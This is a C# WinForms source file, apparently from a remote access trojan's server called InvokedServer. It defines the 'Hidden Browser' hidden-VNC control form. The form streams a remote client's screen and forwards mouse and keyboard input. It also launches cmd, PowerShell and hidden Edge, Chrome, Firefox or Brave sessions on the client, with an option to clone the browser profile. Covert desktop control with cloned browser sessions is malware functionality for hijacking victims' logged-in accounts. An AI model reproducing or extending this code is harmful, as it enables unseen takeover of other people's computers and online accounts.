

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using InvokedCommon.Messages;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;
using InvokedServer.Properties;
using InvokedServer.Utilities;

namespace InvokedServer.Forms
{
	public partial class FrmHiddenBrowser : Form
	{
		private string _windowname = "Hidden Browser";
		private bool _enableMouseInput = true;
		private bool _enableKeyboardInput = true;
		private readonly Client _connectClient;
		private readonly HVNCHandler _HVNCHandler;
		private static readonly Dictionary<Client, FrmHiddenBrowser> OpenedForms = new Dictionary<Client, FrmHiddenBrowser>();

		protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
		{
			this.hvncPictureBox1.TriggerWndProc(ref msg);
			return true;
		}

		public static FrmHiddenBrowser CreateNewOrGetExisting(Client client)
		{
			if (FrmHiddenBrowser.OpenedForms.ContainsKey(client))
				return FrmHiddenBrowser.OpenedForms[client];
			FrmHiddenBrowser newOrGetExisting = new FrmHiddenBrowser(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmHiddenBrowser.OpenedForms.Remove(client));
			FrmHiddenBrowser.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		public FrmHiddenBrowser(Client client)
		{
			this._connectClient = client;
			this._HVNCHandler = new HVNCHandler(client);
			this.RegisterMessageHandler();
			this.InitializeComponent();
			this.hvncPictureBox1.SetHandler(this._HVNCHandler);
			this.hvncPictureBox1.SetMouseInput(this._enableMouseInput);
			this.hvncPictureBox1.SetKeyboardInput(this._enableKeyboardInput);
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Invoke(new MethodInvoker(((Form)this).Close));
		}

		private void RegisterMessageHandler()
		{
			this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
			this._HVNCHandler.ProgressChanged += new MessageProcessorBase<Bitmap>.ReportProgressEventHandler(this.UpdateImage);
			MessageHandler.Register((IMessageProcessor)this._HVNCHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._HVNCHandler);
			this._HVNCHandler.ProgressChanged -= new MessageProcessorBase<Bitmap>.ReportProgressEventHandler(this.UpdateImage);
			this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
		}

		private void StartStream()
		{
			this.ToggleConfigurationControls(true);
			this.hvncPictureBox1.Start();
			this.hvncPictureBox1.SetFrameUpdatedEvent(new FrameUpdatedEventHandler(this.frameCounter_FrameUpdated));
			this.ActiveControl = (Control)this.hvncPictureBox1;
			this.CmdBtn.Enabled = true;
			this.PowershellBtn.Enabled = true;
			this.HiddenEdgeBtn.Enabled = true;
			this.HiddenChromeBtn.Enabled = true;
			this.HiddenFirefoxBtn.Enabled = true;
			this.HiddenBraveBtn.Enabled = true;
		}

		private void StopStream()
		{
			this.ToggleConfigurationControls(false);
			this.hvncPictureBox1.Stop();
			this.hvncPictureBox1.UnsetFrameUpdatedEvent(new FrameUpdatedEventHandler(this.frameCounter_FrameUpdated));
			this.ActiveControl = (Control)this.hvncPictureBox1;
			this._HVNCHandler.EndReceiveFrames();
		}

		private void ToggleConfigurationControls(bool started)
		{
			this.btnStart.Enabled = !started;
			this.btnStop.Enabled = started;
			this.barQuality.Enabled = !started;
		}

		private void TogglePanelVisibility(bool visible)
		{
			this.panelTop.Visible = visible;
			this.btnShow.Visible = !visible;
			this.ActiveControl = (Control)this.hvncPictureBox1;
		}

		private void UpdateImage(object sender, Bitmap bmp)
		{
			this.hvncPictureBox1.UpdateImage(bmp, false);
		}

		private void FrmHVNC_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle(this._windowname, this._connectClient);
			this.OnResize(EventArgs.Empty);
		}

		private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
		{
			this.Text = string.Format("{0} - FPS: {1}", (object)WindowHelper.GetWindowTitle(this._windowname, this._connectClient), (object)e.CurrentFramesPerSecond.ToString("0.00"));
		}

		private void FrmHVNC_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (this._HVNCHandler.IsStarted)
				this.StopStream();
			this.UnregisterMessageHandler();
			this._HVNCHandler.Dispose();
			this.hvncPictureBox1.Image?.Dispose();
		}

		private void FrmHVNC_Resize(object sender, EventArgs e)
		{
			if (this.WindowState == FormWindowState.Minimized)
				return;
			this._HVNCHandler.LocalResolution = this.hvncPictureBox1.Size;
			this.panelTop.Left = (this.Width - this.panelTop.Width) / 2;
			this.btnShow.Left = (this.Width - this.btnShow.Width) / 2;
			this.btnHide.Left = (this.panelTop.Width - this.btnHide.Width) / 2;
		}

		private void btnStart_Click(object sender, EventArgs e) => this.StartStream();

		private void btnStop_Click(object sender, EventArgs e) => this.StopStream();

		private void barQuality_Scroll(object sender, EventArgs e)
		{
			int num = this.barQuality.Value;
			this.lblQualityShow.Text = num.ToString();
			if (num < 25)
				this.lblQualityShow.Text += " (low)";
			else if (num >= 85)
				this.lblQualityShow.Text += " (best)";
			else if (num >= 75)
				this.lblQualityShow.Text += " (high)";
			else if (num >= 25)
				this.lblQualityShow.Text += " (mid)";
			this.ActiveControl = (Control)this.hvncPictureBox1;
		}

		private void btnMouse_Click(object sender, EventArgs e)
		{
			if (this._enableMouseInput)
			{
				this.hvncPictureBox1.Cursor = Cursors.Default;
				this.btnMouse.Image = (Image)Resources.mouse_delete;
				this.toolTipButtons.SetToolTip((Control)this.btnMouse, "Enable mouse input.");
				this._enableMouseInput = false;
				this.hvncPictureBox1.SetMouseInput(this._enableMouseInput);
			}
			else
			{
				this.hvncPictureBox1.Cursor = Cursors.Hand;
				this.btnMouse.Image = (Image)Resources.mouse_add;
				this.toolTipButtons.SetToolTip((Control)this.btnMouse, "Disable mouse input.");
				this._enableMouseInput = true;
				this.hvncPictureBox1.SetMouseInput(this._enableMouseInput);
			}
			this.ActiveControl = (Control)this.hvncPictureBox1;
		}

		private void btnKeyboard_Click(object sender, EventArgs e)
		{
			if (this._enableKeyboardInput)
			{
				this.hvncPictureBox1.Cursor = Cursors.Default;
				this.btnKeyboard.Image = (Image)Resources.keyboard_delete;
				this.toolTipButtons.SetToolTip((Control)this.btnKeyboard, "Enable keyboard input.");
				this._enableKeyboardInput = false;
				this.hvncPictureBox1.SetKeyboardInput(this._enableKeyboardInput);
			}
			else
			{
				this.hvncPictureBox1.Cursor = Cursors.Hand;
				this.btnKeyboard.Image = (Image)Resources.keyboard_add;
				this.toolTipButtons.SetToolTip((Control)this.btnKeyboard, "Disable keyboard input.");
				this._enableKeyboardInput = true;
				this.hvncPictureBox1.SetKeyboardInput(this._enableKeyboardInput);
			}
			this.ActiveControl = (Control)this.hvncPictureBox1;
		}

		private void btnHide_Click(object sender, EventArgs e) => this.TogglePanelVisibility(false);

		private void btnShow_Click(object sender, EventArgs e) => this.TogglePanelVisibility(true);

		private void FullScreen_Click(object sender, EventArgs e)
		{
			if (this.FullScreen.Text == "")
			{
				this.FormBorderStyle = FormBorderStyle.None;
				this.WindowState = FormWindowState.Normal;
				this.WindowState = FormWindowState.Maximized;
				this.FullScreen.Image = (Image)Resources.exit_full_screen1;
				this.FullScreen.Text = " ";
			}
			else
			{
				this.FormBorderStyle = FormBorderStyle.Sizable;
				this.WindowState = FormWindowState.Normal;
				this.FullScreen.Image = (Image)Resources.fullscreen;
				this.FullScreen.Text = "";
			}
		}

		private void ExplorerBtn_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess(null, "StartExplorer");
		}

		private void CmdBtn_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess("C:\\Windows\\System32\\cmd.exe");
		}

		private void PowershellBtn_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
		}

		private void MsEdgeBtn_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
		}

		private void chromeBtn_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
		}

		private void firefoxBtn_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess("C:\\Program Files\\Mozilla Firefox\\firefox.exe");
		}

		private void braveBtn_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess("C:\\Program Files\\BraveSoftware\\Brave - Browser\\Application\\brave.exe");
		}

		private void HiddenEdgeBtn_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess(null, "StartEdge", this.CloneBrowserCheckbox.Checked);
		}

		private void HiddenChromeBtn_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess(null, "StartChrome", this.CloneBrowserCheckbox.Checked);
		}

		private void HiddenFirefoxBtn_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess(null, "StartFirefox", this.CloneBrowserCheckbox.Checked);
		}

		private void HiddenBraveBtn_Click(object sender, EventArgs e)
		{
			this._HVNCHandler.StartProcess(null, "StartBrave", this.CloneBrowserCheckbox.Checked);
		}

		private void MoveWindowsToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void ExtraBtn_Click(object sender, EventArgs e)
		{
			Guna2Button guna2Button = (Guna2Button)sender;
			Point p = new Point(0, guna2Button.Height);
			this.hVNCContextMenuStrip.Show(guna2Button.PointToScreen(p));
		}
	}
}